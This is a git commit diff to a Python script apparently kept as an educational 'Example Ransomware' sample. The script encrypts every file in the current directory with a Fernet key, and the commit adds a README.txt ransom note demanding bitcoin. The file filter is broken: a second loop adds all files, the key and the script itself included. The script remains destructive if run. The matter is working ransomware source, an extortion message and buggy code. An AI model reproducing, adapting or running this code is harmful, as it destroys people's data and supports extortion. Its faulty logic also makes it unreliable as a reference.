1120daf85cdd7bd0edcdddd65d8a35965e77f1e4
Dave Roppo <DavidRoppo@protonmail.com>
2024-01-26 16:09:07 -0500

    Update RansomEncrypt.py

--- Python/Example Ransomware/RansomEncrypt.py
+++ Python/Example Ransomware/RansomEncrypt.py
@@ -5,14 +5,17 @@ from cryptography.fernet import Fernet
 
 #Create empty list to store files in
 files = []
+current_directory = os.getcwd()
 
 #Create for loop to discover all files (not directories) in the current directory and add them to the files list
-for file in os.listdir():
+for file in os.listdir(current_directory):
     #Filter out ransomencrypt.py and thekey.key so they are not added to the files list and encryped
     if file == "ransomencrypt.py" or "thekey.key":
         continue
-    if os.path.isfile(file):
+for file in os.listdir(current_directory):
+    if os.path.isfile(os.path.join(current_directory, file)):
         files.append(file)
+print(files)
 
 #Generate key and assign it to variable "key"
 key = Fernet.generate_key()
@@ -25,7 +28,23 @@ with open("thekey.key", "wb") as thekey:
 for file in files:
     with open(file, "rb") as thefile:
         contents = thefile.read()
+        print(contents)
     contents_encrypted = Fernet(key).encrypt(contents)
     with open(file, "wb") as thefile:
         thefile.write(contents_encrypted)
+        print(contents_encrypted)
+
+# Define the file content
+file_content = "Please send x BTC to this address and we will decrypt your files. Thank you kindly."
+
+# Get the current working directory
+current_directory = os.getcwd()
+
+# Specify the file path
+file_path = os.path.join(current_directory, "README.txt")
+
+# Create and write to the file
+with open(file_path, "w") as file:
+    file.write(file_content)
+
 
